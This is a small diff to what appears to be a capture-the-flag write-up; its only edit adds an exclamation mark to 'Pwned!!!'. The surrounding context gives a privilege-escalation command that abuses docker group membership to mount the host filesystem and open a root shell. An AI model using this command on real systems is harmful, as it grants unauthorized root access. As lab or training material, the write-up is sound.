@@ -34,7 +34,7 @@ Privillage Exclation:
                 when we run id command we found deploy user in docker group so from gtfobins docker run -v /:/mnt --rm -it alpine chroot /mnt sh
                               
 
-Pwned!!!
+Pwned!!!!
 
 
 
